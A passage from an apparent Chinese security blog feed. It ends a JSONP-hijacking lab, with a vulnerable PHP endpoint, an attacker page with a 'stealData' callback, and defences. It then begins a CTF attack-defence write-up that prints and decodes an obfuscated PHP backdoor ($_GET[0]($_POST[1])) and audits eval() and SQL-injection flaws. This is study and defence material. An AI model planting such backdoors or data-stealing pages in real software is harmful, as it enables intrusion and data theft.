class="hljs-string">&#x27;password&#x27;</span>]) )&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">session_set_cookie_params</span>([<br>            <span class="hljs-string">&#x27;lifetime&#x27;</span> =&gt; <span class="hljs-number">3600</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-string">&#x27;/&#x27;</span>,<br>            <span class="hljs-string">&#x27;domain&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>, // 或您的域名<br>            <span class="hljs-string">&#x27;secure&#x27;</span> =&gt; <span class="hljs-literal">true</span>,       // 本地测试可<span class="hljs-literal">false</span>，生产环境必须<span class="hljs-literal">true</span><br>            <span class="hljs-string">&#x27;httponly&#x27;</span> =&gt; <span class="hljs-literal">true</span>,      // 允许JavaScript访问<br>            <span class="hljs-string">&#x27;samesite&#x27;</span> =&gt; <span class="hljs-string">&#x27;None&#x27;</span>     // 必须为None才能跨域<br>        ]);<br><br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;login sucess  &#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;login fail&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/javascript&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$callback</span> . <span class="hljs-string">&#x27;(&#x27;</span> . <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$user</span>) . <span class="hljs-string">&#x27;);&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>部署在vps</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;script&gt;<br>        <span class="hljs-comment">// 定义一个回调函数，窃取数据</span><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stealData</span>(<span class="hljs-params">data</span>) </span>&#123;<br>            <span class="hljs-title function_ invoke__">alert</span>(JSON.<span class="hljs-title function_ invoke__">stringify</span>(data));<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;!-- 利用 JSONP 漏洞加载数据 --&gt;<br>&lt;script src=<span class="hljs-string">&quot;http://localhost/jsonp.php?callback=stealData&quot;</span>&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>先登录，然后在新标签访问vps的html（模拟点击钓鱼链接）触发csrf</p><p><img src="/mdimg/cors/1744981598211-49a6a0b0-7ce3-45c6-b384-688a59f01585.png"></p><p>可以看到发送了3个请求</p><p><img src="/mdimg/cors/1744981598279-d0d8d61f-9b53-454e-9391-1e2c29f946fd.png"></p><p>看一下服务端返回的数据</p><p><img src="/mdimg/cors/1744981598820-23155952-1064-4b85-b4fb-305e28fd2357.png"></p><p>浏览器接收到响应</p><p><code>stealData(&#123; username: &#39;admin&#39;, email: &#39;admin@example.com&#39;, password: &#39;123&#39; &#125;);</code></p><p>会调用当前页面（也就是vps的html）的<code>stealData</code>方法<code>alert</code>数据</p><p>完整攻击链</p><p><img src="/mdimg/cors/1744981599072-f46428c2-eb56-46c6-b41e-3f4ad37a6093.png"></p><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a><strong>防御</strong></h2><h3 id="动态回调方法名"><a href="#动态回调方法名" class="headerlink" title="动态回调方法名"></a><strong>动态回调方法名</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;jsonp_token&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;jsonp_token&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)); <span class="hljs-comment">// 生成随机 Token</span><br>&#125;<br><br><span class="hljs-variable">$callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$callback</span> !== <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;jsonp_token&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid Callback&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$callback</span>(&quot;</span> . <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&quot;);&quot;</span>;<br></code></pre></td></tr></table></figure><p>用随机的token作为回调方法名，此时无法伪造回调方法</p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a><strong>CSRF Token</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;csrf_token&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;csrf_token&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;csrf_token&#x27;</span>] !== <span class="hljs-variable">$token</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid CSRF Token&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>] ?? <span class="hljs-string">&#x27;defaultCallback&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$callback</span>(&quot;</span> . <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&quot;);&quot;</span>;<br></code></pre></td></tr></table></figure><p>防止csrf，无法通过盗用cookie来访问敏感数据</p><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a><strong>其他方法</strong></h3><ol><li>改用CORS</li><li> 敏感数据不用jsonp传输</li></ol>]]></content>
    
    
    <categories>
      
      <category>研究</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>“古剑山”第二届全国大学生网络攻防大赛决赛-web</title>
    <link href="/2025/04/05/%E2%80%9C%E5%8F%A4%E5%89%91%E5%B1%B1%E2%80%9D%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-web/"/>
    <url>/2025/04/05/%E2%80%9C%E5%8F%A4%E5%89%91%E5%B1%B1%E2%80%9D%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-web/</url>
    
    <content type="html"><![CDATA[<p>打的是awd，web有两题，一题是php一题是python</p><h1 id="wj"><a href="#wj" class="headerlink" title="wj"></a>wj</h1><p><a href="https://wwpq.lanzouq.com/irueQ2ss2oqb">https://wwpq.lanzouq.com/irueQ2ss2oqb</a></p><h2 id="先d盾开扫"><a href="#先d盾开扫" class="headerlink" title="先d盾开扫"></a>先d盾开扫</h2><p><img src="/mdimg/gjsweb/1743834834316-0c2654a3-a438-4808-94a5-2c01be5f8e86.png"></p><p>接着看<code>config.php</code>，每个变量打印一下分析(已写到注释)，也可以直接调试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>@<span class="hljs-variable">$_</span>++; <span class="hljs-comment">//1</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&quot;`&quot;</span>^<span class="hljs-string">&quot;?&quot;</span>).(<span class="hljs-string">&quot;:&quot;</span>^<span class="hljs-string">&quot;&#125;&quot;</span>).(<span class="hljs-string">&quot;%&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;&#123;&quot;</span>^<span class="hljs-string">&quot;/&quot;</span>); <span class="hljs-comment">//_GET</span><br><span class="hljs-variable">$___</span>=(<span class="hljs-string">&quot;$&quot;</span>^<span class="hljs-string">&quot;&#123;&quot;</span>).(<span class="hljs-string">&quot;~&quot;</span>^<span class="hljs-string">&quot;.&quot;</span>).(<span class="hljs-string">&quot;/&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;-&quot;</span>^<span class="hljs-string">&quot;~&quot;</span>).(<span class="hljs-string">&quot;(&quot;</span>^<span class="hljs-string">&quot;|&quot;</span>); <span class="hljs-comment">//_POST</span><br><span class="hljs-variable">$a</span> = $&#123;<span class="hljs-variable">$__</span>&#125;[!<span class="hljs-variable">$_</span>]($&#123;<span class="hljs-variable">$___</span>&#125;[<span class="hljs-variable">$_</span>]); <span class="hljs-comment">//$a = $_GET[false]($_POST[1]);</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/gjsweb/1743834613432-ad17708b-abaf-42cb-a3ff-6fa367ad43f7.png"></p><ul><li><code>$&#123;$__&#125;</code> →<code>$_GET</code>（因为<code>$__ = &quot;_GET&quot;</code>）</li><li><code>$&#123;$___&#125;</code> →<code>$_POST</code>（因为<code>$___ = &quot;_POST&quot;)</code></li><li><code>!$_</code> →<code>false</code>（因为<code>$_ = 1</code>，<code>!1</code> →<code>false</code>）</li><li><code>$_</code> → <code>1</code></li></ul><p>最终得到<code>$a = $_GET[0]($_POST[1]);</code> 很明显就是一个后门</p><p><img src="/mdimg/gjsweb/1743834547797-d2e65af7-411b-4afd-aea5-c246c7442e04.png"></p><p>修复的话，后门直接删除就行。</p><h2 id="接着开始审计"><a href="#接着开始审计" class="headerlink" title="接着开始审计"></a>接着开始审计</h2><p>先审入口文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./common/function.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./include/config.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./lib/base.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html; charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;On&quot;</span>); <span class="hljs-comment">//开启报错</span><br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]:<span class="hljs-string">&#x27;User&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]:<span class="hljs-string">&#x27;Index&#x27;</span>;<br><br><span class="hljs-variable">$obj</span>=<span class="hljs-title function_ invoke__">run_c</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-title function_ invoke__">run_a</span>(<span class="hljs-variable">$obj</span>,<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>接收两个<code>get</code>的参数<code>c</code>和<code>a</code>并设置默认值为<code>User</code>和<code>Index</code></p><p>然后调用了两个方法：<code>$obj=run_c($c);``run_a($obj,$a);</code></p><p>跟进这两个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run_c</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br><br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\w+$/&#x27;</span>, <span class="hljs-variable">$class</span>) <span class="hljs-keyword">or</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOTDRI.<span class="hljs-string">&quot;/lib/&quot;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&quot;.php&quot;</span>)) )&#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;hack&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./lib/&quot;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&quot;.php&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>;<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run_a</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span>,<span class="hljs-variable">$action</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[\w\W].*$/&#x27;</span>, <span class="hljs-variable">$action</span>))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;hack&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$obj-&gt;&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;();&#x27;</span>);<br>  &#125;<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>run_c</code>传入的是类文件的文件名并且限制目录为<code>lib</code>，返回该类的对象。正则匹配<code>/^\w+$/</code>只允许传入数字字母下划线，无法传入<code>.</code>和斜杠<code>/</code>，防止了目录穿越。</p><p><code>run_a</code>接收对象和方法名，然后通过<code>eval</code>执行该对象的方法，<code>/^[\w\W].*$/</code>只检测方法名不为空。</p><p>接着看类文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">base</span></span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;conn=<span class="hljs-title function_ invoke__">mysql_connect</span>(DBHOST,DBUSER,DBPASS);<br>        <span class="hljs-title function_ invoke__">mysql_select_db</span>(DBNAME);<br><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>            <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><br>            <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn);<br>            <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>();<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$username</span>;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php?c=User&amp;a=home&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;password error!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Index</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <br>        <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;index.tpl&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Home</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$this</span>-&gt;conn);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;birthday&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;birthday&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;phonenumber&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;phonenumber&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;QQ&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;QQ&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;reward&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;reward&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;motto&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;motto&#x27;</span>];<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;age&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;sex&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sex&#x27;</span>] = <span class="hljs-string">&quot;女&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sex&#x27;</span>] = <span class="hljs-string">&quot;男&quot;</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>            <span class="hljs-comment">//example</span><br>            <span class="hljs-comment">//把所有session的数据放到表格中！</span><br>            <span class="hljs-variable language_">$this</span>-&gt;tp-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-variable">$_SESSION</span>[<span 